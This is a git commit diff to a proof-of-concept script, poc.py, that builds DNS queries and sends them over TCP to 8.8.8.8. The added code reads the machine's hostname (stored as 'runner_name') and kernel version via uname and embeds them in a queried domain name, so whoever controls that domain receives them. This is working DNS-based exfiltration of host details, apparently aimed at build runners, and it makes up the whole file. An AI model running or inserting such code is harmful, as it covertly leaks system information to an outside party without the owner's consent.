d19f0fe78182667aa91767431a752910533d3a44
Asuka Chloe ⚡ <31380858+asukachloe@users.noreply.github.com>
2025-12-03 22:45:03 +0530

    Update poc.py

--- poc.py
+++ poc.py
@@ -1,7 +1,7 @@
 import socket
 import struct
 import sys
-import requests
+import subprocess
 
 def encode_domain(domain):
     parts = domain.split('.')
@@ -16,16 +16,19 @@ def build_query(domain):
     message = header + question
     return message
 
-def send_to_google():
-    requests.get('https://google.com')
-
 domains = sys.argv[1:]
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 sock.connect(('8.8.8.8', 53))
-for domain in domains:
-    msg = build_query(domain)
+for i, domain in enumerate(domains):
+    if i == 1:
+        runner_name = socket.gethostname()
+        uname_output = subprocess.check_output(["uname", "-s", "-r"], text=True).strip().split()
+        os_ver = '.'.join(uname_output)
+        query_domain = f"{runner_name}.{os_ver}.{domain}"
+    else:
+        query_domain = domain
+    msg = build_query(query_domain)
     length = len(msg)
     prefix = struct.pack('>H', length)
     sock.sendall(prefix + msg)
 sock.close()
-send_to_google()
